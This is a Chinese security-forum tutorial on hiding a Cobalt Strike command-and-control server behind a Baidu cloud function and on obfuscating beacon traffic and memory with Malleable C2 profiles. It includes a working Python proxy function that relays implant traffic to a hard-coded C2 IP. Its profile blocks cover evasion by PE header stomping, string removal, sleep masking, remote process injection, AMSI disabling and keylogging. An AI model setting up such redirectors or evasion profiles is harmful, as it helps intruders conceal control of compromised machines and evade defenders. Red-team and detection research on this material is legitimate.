# 云函数利用&Profile混淆

> **来源**: https://forum.butian.net/share/3126  
> **文章ID**: 3126

---

云函数
===

云函数（Serverless Cloud Function，SCF）是云服务商为企业和开发者们提供的无服务器执行环境，帮助您在无需购买和管理服务器的情况下运行代码。

提供云函数服务商
--------

阿里云：<https://www.aliyun.com/product/fc>  
腾讯云：<https://console.cloud.tencent.com/scf/>  
华为云：<https://developer.huawei.com/consumer/cn/agconnect/cloud-function/>  
百度云：<https://cloud.baidu.com/product/cfc.html>  
移动云：<https://ecloud.10086.cn/home/product-introduction/sfc>  
天翼云：<https://www.ctyun.cn/products/hsjs>  
字节跳动轻服务：<https://qingfuwu.cn/>  
AWS Lambda：<https://aws.amazon.com/lambda/>  
Google Firebase：<https://firebase.google.com/>  
Azure Function：<https://azure.microsoft.com/en-us/services/functions/>

利用场景
----

1、用于隐藏上线的服务器IP  
2、域名白名单出网上线

本篇要接触学习的是百度智能云，案例及教程网上**独一无二：)**

### 第一步

注册账号、实名认证，创建函数，选择空白函数

![Untitled.png](images/attach-fb1c01848355356a7f7e77da4651f5f7b931d0cd.png)

根据网上适用于腾讯云、阿里云的代理脚本，执行函数环境应当选择python3

![Untitled1.png](images/attach-3dab39bea152e70ffbab7007291ab19b42d217cd.png)

选择http触发器，配置好url路径和http方法提交即可，因为跟腾讯云函数配置不相同，**这里的url路径是个坑点！因为CS每次请求的url路径都是随机的！并且需要对设置url路径做好正则匹配！不然请求云函数链接就是404！这样就没办法执行到函数代码部分！！**

![Untitled2.png](images/attach-c2dfa072479a9339a056b4bb3ce355498b6df82a.png)

![Untitled3.png](images/attach-4e4841dc9a17d40dd058d2dcfb9585cdd9a35c8b.png)

### 第二步

配置函数代码，这段代码可以理解为将服务商云函数作为代理，木马通过http/https连接云函数，借助云函数将访问路径和请求内容转发给我们的C2服务器，随后C2应答请求的返回包传回至云函数，云函数再转发回木马接收处理

```python
# -*- coding: utf-8 -*-

# def handler(event, context): 
#     return "Hello World"
import json,requests,base64
def handler(event, context):
    C2='<https://110.40.213.80:443>' # 这里可以使用 HTTP、HTTPS~下角标~
    path=event['path']
    headers=event['headers']
    print(event)
    if event['httpMethod'] == 'GET' :
        resp=requests.get(C2+path,headers=headers,verify=False)
    else:
        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
        print(resp.headers)
        print(resp.content)
    response={
        "isBase64Encoded": True,
        "statusCode": resp.status_code,
        "headers": dict(resp.headers),
        "body": str(base64.b64encode(resp.content))[2:-1]
    }
    #return event
    return response
```

在触发器可以看到云函数的域名，百度云服务商仅支持https

![Untitled4.png](images/attach-89e5f11db4bea9a1e5c2e82a4ea13eb67bdda881.png)

接下来配置C2的监听器并生成木马文件，注意脚本中的http/https协议要与beacon协议一致，端口号一致

![微信截图_20240702140951.png](images/attach-702b67ec5866d602a59ff5865334827179c230b0.png)

从以上细节可以看出这种方式不仅能绕过域名白名单限制，还能隐藏好C2ip，因为中间的https流量只会出现云函数的域名，并且服务端IP已被隐藏

![Untitled5.png](images/attach-d9a184a4abe372282ab4e447172758b55071ab90.png)

当然，为了更好的混淆流量，启动CS的时候你可以配置一下profile（也可以不配置）

Profile混淆
=========

Cobalt Strike工具的主要配置是使用profile配置文件指定的。该工具使用配置文件中的值来生成 Beacon 有效负载，用户创建配置文件并使用可延展命令和控制(C2)配置文件语言设置其值。为CS设置有效的profile配置文件，可以起到对CS流量、内存进行混淆的作用。

![Untitled6.png](images/attach-4a5165a74360c44ca27da9555c97f8e88b7812e0.png)

以下是一个简单的模板

```json
#这是一个简单的模板
###global options###
set sleeptime "10000";     # 睡眠时间，单位ms，可选择长一点
set jitter "0";           # 睡眠抖动时间，百分比0-99
#set host_stage "false";      # 设置所有的Payload都为Stageless，提高安全性
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0";

###SSL Options###
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

https-certificate {
    set C "US";                      # 单位的两字母国家代码
    set CN "Microsoft IT TLS CA 2";  # 通用名称
    set L "Redmond";                 # 城市或区域名称
    set O "Microsoft Corporation";   # 组织名称
    set OU "Microsoft IT";           # 组织单位名称
    set ST "Washington";             # 州或省份名称
    set validity "365";
}

##CODE-SIGNER Block###
code-signer{
    # 用于签名 Windows Executable and Windows Executable (S)，确保Payload一致性
    set keystore "cobaltstrike1.store"; 
    set password "password";
    set alias "certificate";
}

###HTTP-GET Block###
http-get {
    set uri "/login /config /admin /history"; # 自定义多个url请求路径，以空格相隔
    # GET请求头部
    client {
        # header "Host" "www.xxxx.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        metadata {
            netbiosu;           # netbios(大写)编码
            append ".php";      # 追加参数内容尾缀
            parameter "file";   # 将内容放在新增的url参数中
            #prepend "user=";   # 追加参数内容前缀
            #header "Cookie";   # 添加到HTTP Cookie头中
        }
    }

    server {
                # 该GET请求返回包头部
        header "Content-Type" "text/plain";
        output {
            base64;             # 将内容base64编码传回
            print;              # 将内容输出于HTTP Body中
        }
    }
}

###HTTP-Post Block###
http-post {
    set uri "/page= /index=";   # 不能与http-get的url请求路径完全相同
        # POST请求头部
    client {
        # header "Host" "www.baidu.com";
      header "Accept" "*/*";
      header "Accept-Language" "en";
        header "Connection" "close";     
        id {
            netbios;
            append ".php";
            uri-append;         # 追加到url末尾
        }
        output {
            base64;   
              print;
        }
    }

    server {
        output {
            base64;
            print;
        }
    }
}
```

1. 全局选项：这是一些设置C2服务器的基本参数的选项，比如设置使用的SSL证书文件，设置服务器端口等。
2. http-stager：这部分设置用于控制使用HTTP或HTTPS协议的stager的行为。比如，可以设置User-Agent、URI、POST请求的数据格式等。
3. http-get：这部分设置用于控制Beacon从C2服务器获取任务时发送的HTTP GET请求的格式。
4. http-post：这部分设置用于控制Beacon向C2服务器发送数据时发送的HTTP POST请求的格式。
5. metadata：这部分设置用于控制Beacon和C2服务器交换的元数据的格式。

官方profile配置模板参考：[https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2\_main.htm#\_Toc65482834](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm#_Toc65482834)

流量侧
---

以http/https为例，木马和CS服务端进行http通信的时候是通过GET或POST等方法直接进行传输的，这样的话攻击流量就会很容易的被识别到，因此可通过TLS加密也可以通过配置profile进行混淆，建议一起食用。

profile配置文件中对GET和POST请求包做了内容新增，使得流量看起来不那么恶意。以下profile是我根据https://github.com/threatexpress/malleable-c2/tree/master进行仿写的，该项目主要利用了主流的javascript库做的混淆

（项目中的文件可以通过上述github链接获取，文件内容太多就不贴出来了）

![Untitled7.png](images/attach-a2ffe98c4bab87502367ba95bb2c86a6cd146487.png)

从以上profile文件中可以看到我对header、url、回显信息做了混淆，并且尝试能正常执行。更多关于流量的profile配置内容可参考：<https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#http-get>

![Untitled8.png](images/attach-a4b70694878da512c0757a8953c7b92f43e5a7a3.png)

### wireshark

木马需要从本地去解析云函数地址，返回了云函数服务器IP，因此DNS流量中是可以看到云函数地址的

![Untitled9.png](images/attach-6cfad2faed8b13bf5ab111e561a675c6f6220dbd.png)

通过抓取流量可以通过请求或返回包大小来判断区分心跳和行为流量包

![Untitled10.png](images/attach-fbdf0a0831e156f6b1d62e1297e2958ba4d2aebd.png)

而传输内容都做了https加密，且服务端使用了本地注册的keystore

![Untitled11.png](images/attach-7e58eebb9eab4941ce52088bc81217f115a04ed9.png)

### burpsuite（本地证书）

在本地安装了burpsuite证书进行抓包。由于我们通过设置profile中的append作为CS服务端的回传信息，我们仔细看`return-1},P="`后内容  
**心跳**

从数据包上看可以看到木马发送请求包内容中有profile设置好的url、header等信息，设置了指定的cookie字段存放传输系统有关的元数据，返回包内容也与profile配置文件中的一致

![Untitled12.png](images/attach-cb5e0b22aff0e37f234529c8af9f95a1a4c52241.png)

**执行命令**

由于心跳回连服务端的关系，木马需要从服务端返回包信息中提取出需要做的动作，例如我在这个会话执行了shell ipconfig

![Untitled13.png](images/attach-9306f9aae48e621553bc5de7742ecc84bb827206.png)

等木马完成行为后，将执行结果通过POST请求包发送至服务端，咱们的客户端console才能够回显正常信息

![Untitled14.png](images/attach-8d0071134de9357b01723577196d01058302b110.png)

主机侧
---

### stage标签

无阶段payload会远程加载并执行stage，其实这个stage就是一个反射dll(Beacon Dll)，通过修改stage块的内容可以扩展Beacon Dll的功能，以此达到一定的混淆效果。在stage标签中可以设置beacon的元数据修改、在内存中的属性、数据的替换、加解密混淆等

```json
//设置执行反射dll所分配的内存属性，true为RWX，false为RX
set userwx "false";
//设置true后，会抹去存放在内存中的反射DLL
set cleanup "true";
//设置为true时，Beacon会加入一段加解密函数，会对数据和代码进行异或加密，3.11版本是单字节异或，4.2版本是13字节异或。
set sleep_mask "true";
//设置为true时能对MZ、PE和e_lfanew的值进行混淆，这样能使根据MZ等关键字的内存匹配失效
set stomppe "true";
//设置为true时，能混淆dll的导入表、区段名等信息
set obfuscate "true";
//开启智能注入，尝试避免在注入Beacon时引起异常
set smartinject "true";
//设置内存分配器的类型，默认的内存分配器 VirtualAlloc，可以选择使用 HeapAlloc 或 MapViewOfFile 来替代。
set allocator "VirtualAlloc";

//从文件静态特征上做混淆
//设置PE头部的校验和
set checksum       "0";
//设置PE、DLL程序编译时间
set compile_time   "11 Nov 2014 06:18:30";
//设置PE头部的入口点
set entry_point    "650688";
// 设置PE头部的图像大小（x86）
set image_size_x86 "4661248";
//设置PE头部的图像大小（x64）
set image_size_x64 "4661248";
//设置PE头部的名称
set name           "srv.dll";
//定义用于替换Beacon反射性DLL的PE头的自定义字节
set magic_pe "LE";
//设置用于替换Beacon反射性DLL的Rich Header的自定义字节
set rich_header    "\\x3e\\x98\\xfe\\x75\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x73\\x81\\x03\\x26\\xfc\\xf9\\x90\\x26\\x17\\xa4\\x93\\x27\\x79\\xf9\\x90\\x26\\x7a\\xf9\\x91\\x26\\x83\\xfd\\x90\\x26\\x17\\xa4\\x91\\x27\\x65\\xf9\\x90\\x26\\x17\\xa4\\x95\\x27\\x77\\xf9\\x90\\x26\\x17\\xa4\\x94\\x27\\x6c\\xf9\\x90\\x26\\x17\\xa4\\x9e\\x27\\x56\\xf8\\x90\\x26\\x17\\xa4\\x6f\\x26\\x7b\\xf9\\x90\\x26\\x17\\xa4\\x92\\x27\\x7b\\xf9\\x90\\x26\\x52\\x69\\x63\\x68\\x7a\\xf9\\x90\\x26\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00";

//transform-x86和transform-x64标签，strrep标签中主要是修改替换反射dll中的固定字符，以防止被文件静态特征所匹配
transform-x86 {
        prepend "\\x90\\x90\\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "This program cannot be run in DOS mode" "";
}
......
```

### **process-inject**标签

process-inject标签是用于控制 Beacon 在注入到远程进程时的行为。在进行攻击时，攻击者可能会尝试将 Beacon 注入到一个正在运行的进程中以实现持久化和隐藏  
以下代码是Cobalt Strike配置中进程注入部分的设置，定义了Cobalt Strike如何在远程进程中注入和执行代码。

- 设置使用VirtualAllocEx函数为远程进程分配内存
- 内存分配的最小值设为7814字节
- 指定新分配的内存区域不应该具有读、写和执行（RWX）权限
- 允许在分配和写入载荷之前，内存区域具有读、写和执行（RWX）权限
- 在注入的代码前添加了几个NOP（无操作）指令，避免某些防御机制的检测
- 定义了多种在远程进程中执行代码的方法，提供进程注入的灵活性，更难被防御措施检测
    
    ```json
    process-inject {
    // 设置远程内存分配技术
    set allocator "VirtualAllocEx";
    
    // 形状注入内容和属性
    set min_alloc "7814";  //# 设置内存分配的最小值为7814字节
    set userwx    "false";  // 分配的内存不应具有读、写和执行（RWX）权限
    set startrwx "false";  // 注入代码前，内存不应被设置为具有读、写和执行（RWX）权限
    
    transform-x86 {
        // 在注入的代码前添加 NOP （无操作）指令
        prepend "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"; // NOP, NOP!
    }
    
    transform-x64 {
        // 在注入的代码前添加 NOP （无操作）指令
        prepend "\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"; // NOP, NOP!
    }
    
    // 指定在远程进程中执行代码的方法
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2285";  // 使用CreateThread函数执行代码
        NtQueueApcThread-s;  // 使用NtQueueApcThread-s函数执行代码
        SetThreadContext;  // 使用SetThreadContext函数执行代码
        CreateRemoteThread;  // 使用CreateRemoteThread函数执行代码
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";  // 使用CreateRemoteThread函数并偏移执行代码
        RtlCreateUserThread;  // 使用RtlCreateUserThread函数执行代码
    }
    }
    ```

### **post-ex**标签

在Cobalt Strike的Beacon payload中是用来配置后期执行（post-exploitation）阶段的一些参数。这些参数主要影响和控制如何创建新的进程、怎样注入和执行代码、如何混淆和隐藏行为以及如何收集和传输数据等。

攻击者在拥有目标系统的访问权限后，通常需要进行一系列的后期执行活动，这些活动需要对目标系统进行一系列复杂的操作，如创建和管理新的进程、注入和执行代码、使用不同的通信方式来传输数据等。post-ex标签就是用来配置和控制这些操作的一系列参数。

```json
post-ex {
    // 控制我们产生的临时进程。Beacon将产生一个临时进程，将shellcode注入其中，并让新的进程执行这个shellcode。
    set spawnto_x86 "%windir%\\\\syswow64\\\\svchost.exe"; // 对于32位payloads
    set spawnto_x64 "%windir%\\\\sysnative\\\\svchost.exe"; // 对于64位payloads

    // 改变我们的post-ex DLLs的权限和内容。此设置启用对Beacon用于post-ex任务的DLLs(如键盘记录或令牌操作)的混淆。
    set obfuscate "true";

    // 更改我们的post-ex输出命名管道名称。此设置允许控制Beacon用于从作业中检索输出的命名管道。
    set pipename "srvsvc-1-5-5-0####";

    // 将关键函数指针从Beacon传递到其子作业。启用smart注入将使Beacon将带有关键函数指针的数据结构传递给其post-ex作业。
    set smartinject "true";

    // 允许多线程post-ex DLLs产生带有伪装起始地址的线程。
    // set thread_hint "module!function+0x##";

    // 在powerpick、execute-assembly和psinject中禁用AMSI。此选项将会在目标进程中修补AMSI。
    set amsi_disable "true";

    // 控制用于记录键盘击键的方法
    set keylogger "SetWindowsHookEx";
}
```

更多后渗透标签可参考：<https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-pe-process-injection-and-post-exploitationbeacon-hang-wei>
